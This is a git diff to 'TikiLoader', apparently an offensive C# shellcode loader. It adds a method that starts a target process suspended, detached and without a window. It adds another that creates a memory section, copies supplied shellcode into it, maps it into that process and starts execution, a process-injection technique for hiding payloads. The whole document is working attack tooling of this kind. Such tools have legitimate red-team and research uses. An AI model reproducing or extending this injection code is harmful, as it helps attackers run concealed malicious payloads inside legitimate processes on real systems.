@@ -175,6 +175,28 @@ namespace TikiLoader
             }
         }
 
+        public PROCESS_INFORMATION StartProcessWOPid(string targetProcess)
+        {
+            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+
+            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
+            IntPtr lpValue = IntPtr.Zero;
+
+            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+            pSec.nLength = Marshal.SizeOf(pSec);
+            tSec.nLength = Marshal.SizeOf(tSec);
+
+            uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;
+
+            if (!CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo))
+                throw new SystemException("[x] Failed to create process!");
+
+            return pInfo;
+
+        }
+
         public PROCESS_INFORMATION StartProcessAs(string path, string domain, string username, string password)
         {
             STARTUPINFO startInfo = new STARTUPINFO();
@@ -470,6 +492,21 @@ namespace TikiLoader
             CloseHandle(pinf.hThread);
             CloseHandle(pinf.hProcess);
 
+        }
+
+        public void LoadWithoutPid(string binary, byte[] shellcode)
+        {
+            var pinf = StartProcessWOPid(binary);
+            FindEntry(pinf.hProcess);
+
+            if (!CreateSection((uint)shellcode.Length))
+                throw new SystemException("[x] Failed to create new section!");
+
+            SetLocalSection((uint)shellcode.Length);
+            CopyShellcode(shellcode);
+            MapAndStart(pinf);
+            CloseHandle(pinf.hThread);
+            CloseHandle(pinf.hProcess);
         }
 
         public void LoadAs(string binary, byte[] shellcode, string domain, string username, string password)
